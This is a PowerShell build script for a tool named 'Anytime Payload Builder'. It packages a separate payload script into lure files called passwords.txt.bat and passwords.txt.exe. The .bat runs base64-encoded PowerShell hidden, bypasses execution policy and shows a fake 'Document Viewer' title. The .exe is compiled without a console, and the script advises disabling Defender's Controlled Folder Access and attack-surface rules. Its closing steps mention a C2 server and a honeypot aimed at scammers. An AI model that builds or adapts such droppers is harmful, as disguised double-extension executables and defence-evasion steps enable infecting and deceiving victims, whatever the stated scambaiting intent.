# Build Anytime Payload
# Generates passwords.txt.bat and passwords.txt.exe
# Usage: .\build.ps1 [bat|exe|both]
#        .\build.ps1 -Dev (builds .exe with visible console for debugging)

param(
    [string]$Target = "both",
    [switch]$Dev
)

# Dev mode: only build .exe with visible console
if ($Dev) {
    $Target = "exe"
    Write-Host ""
    Write-Host "======================================"
    Write-Host "  Anytime Payload Builder (DEV MODE)"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Building with VISIBLE console for debugging..." -ForegroundColor Yellow
    Write-Host ""
} else {
    Write-Host ""
    Write-Host "======================================"
    Write-Host "  Anytime Payload Builder"
    Write-Host "======================================"
    Write-Host ""
}

# ============================================
# BUILD .BAT VERSION
# ============================================

if ($Target -eq "bat" -or $Target -eq "both") {
    Write-Host "Building passwords.txt.bat..."
    
    if (!(Test-Path "payload.ps1")) {
        Write-Host "ERROR: payload.ps1 not found!" -ForegroundColor Red
        exit 1
    }
    
    # Read payload
    $payload = Get-Content "payload.ps1" -Raw -Encoding UTF8
    
    # Encode to UTF-16LE and Base64
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $base64 = [Convert]::ToBase64String($bytes)
    
    # Create .bat wrapper
    $bat = @"
@echo off
title Document Viewer
echo Loading document...

powershell.exe -W Hidden -NoP -EP Bypass -NonI -E $base64

echo Complete.
exit
"@
    
    Write-Host ""
    Write-Host "  Generated .bat content:" -ForegroundColor Cyan
    Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
    Write-Host $bat -ForegroundColor Gray
    Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    
    try {
        $batPath = Join-Path $PWD "passwords.txt.bat"
        Write-Host "  DEBUG: Writing to: $batPath" -ForegroundColor Cyan
        
        [System.IO.File]::WriteAllText($batPath, $bat, [System.Text.Encoding]::ASCII)
        Write-Host "  DEBUG: Write completed without errors" -ForegroundColor Cyan
        
        # Check immediately
        if (Test-Path $batPath) {
            Write-Host "  DEBUG: File exists immediately after write" -ForegroundColor Cyan
            Start-Sleep -Milliseconds 500
            
            if (Test-Path $batPath) {
                $fileInfo = Get-Item $batPath
                Write-Host "  -> passwords.txt.bat created (Size: $($fileInfo.Length) bytes)" -ForegroundColor Green
            } else {
                Write-Host "  ERROR: File existed but was deleted within 500ms!" -ForegroundColor Red
                Write-Host "  CAUSE: Defender (or another security tool) quarantined it after creation" -ForegroundColor Red
                Write-Host "  ACTION: Check Windows Security -> Protection History for details" -ForegroundColor Yellow
            }
        } else {
            Write-Host "  ERROR: File never appeared on disk (write intercepted)" -ForegroundColor Red
            Write-Host "  CAUSE: Write operation blocked by Controlled Folder Access or ASR rules" -ForegroundColor Red
            Write-Host "  ACTION: Disable Controlled Folder Access and Attack Surface Reduction" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  ERROR: Write operation threw exception: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  CAUSE: Insufficient permissions or file system error" -ForegroundColor Red
        Write-Host "  ACTION: Run PowerShell as Administrator" -ForegroundColor Yellow
    }
}

# ============================================
# BUILD .EXE VERSION
# ============================================

if ($Target -eq "exe" -or $Target -eq "both") {
    Write-Host ""
    Write-Host "Building passwords.txt.exe..."
    
    # Check required files
    if (!(Test-Path "launcher.py")) {
        Write-Host "ERROR: launcher.py not found!" -ForegroundColor Red
        exit 1
    }
    if (!(Test-Path "payload.ps1")) {
        Write-Host "ERROR: payload.ps1 not found!" -ForegroundColor Red
        exit 1
    }
    if (!(Test-Path "icon.ico")) {
        Write-Host "ERROR: icon.ico not found!" -ForegroundColor Red
        exit 1
    }
    
    # Find Python
    $python = "python"
    if (!(Get-Command python -ErrorAction SilentlyContinue)) {
        $python = "python3"
        if (!(Get-Command python3 -ErrorAction SilentlyContinue)) {
            Write-Host "ERROR: Python not found!" -ForegroundColor Red
            exit 1
        }
    }
    
    # Check PyInstaller
    & $python -m pip show pyinstaller >$null 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  PyInstaller not found. Installing..." -ForegroundColor Yellow
        & $python -m pip install pyinstaller
        if ($LASTEXITCODE -ne 0) {
            Write-Host "ERROR: Failed to install PyInstaller" -ForegroundColor Red
            exit 1
        }
    }
    
    # Determine separator (Windows uses ;, others use :)
    $sep = if ($IsWindows -or $env:OS -match "Windows") { ";" } else { ":" }
    
    # Build with PyInstaller (with or without console depending on dev mode)
    if ($Dev) {
        Write-Host "  Building with --console flag..." -ForegroundColor Cyan
        & $python -m PyInstaller `
            --onefile `
            --console `
            --icon=icon.ico `
            --name=passwords.txt `
            --add-data="payload.ps1$sep." `
            --clean `
            launcher.py
    } else {
        & $python -m PyInstaller `
            --onefile `
            --noconsole `
            --icon=icon.ico `
            --name=passwords.txt `
            --add-data="payload.ps1$sep." `
            --clean `
            launcher.py
    }
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ERROR: Build failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host "  -> dist\passwords.txt.exe created" -ForegroundColor Green
    
    # Create or remove .dev_mode marker
    if ($Dev) {
        New-Item -ItemType File -Path "dist\.dev_mode" -Force | Out-Null
        Write-Host "  -> Created .dev_mode marker" -ForegroundColor Cyan
    } else {
        if (Test-Path "dist\.dev_mode") {
            Remove-Item "dist\.dev_mode" -Force
            Write-Host "  -> Removed old .dev_mode marker" -ForegroundColor Gray
        }
    }
    
    # Clean up
    if (Test-Path "build") { Remove-Item "build" -Recurse -Force }
    if (Test-Path "__pycache__") { Remove-Item "__pycache__" -Recurse -Force }
    Write-Host "  -> Build artifacts cleaned" -ForegroundColor Gray
}

# ============================================
# DONE
# ============================================

Write-Host ""
Write-Host "======================================"
if ($Dev) {
    Write-Host "  Dev Build Complete!"
    Write-Host "======================================"
    Write-Host ""
    Write-Host "Dev build created with VISIBLE console windows." -ForegroundColor Yellow
    Write-Host "You'll see all PowerShell output when you run dist\passwords.txt.exe" -ForegroundColor Yellow
} else {
    Write-Host "  Build Complete!"
    Write-Host "======================================"
}
Write-Host ""
Write-Host "Next steps:"
Write-Host "  1. Start C2 server: cd ..\sender && python sender.py"
if ($Dev) {
    Write-Host "  2. Run dist\passwords.txt.exe to test (console will show debug output)"
} else {
    Write-Host "  2. Deploy payload to honeypot VM"
    Write-Host "  3. Wait for scammer to execute"
}
Write-Host ""
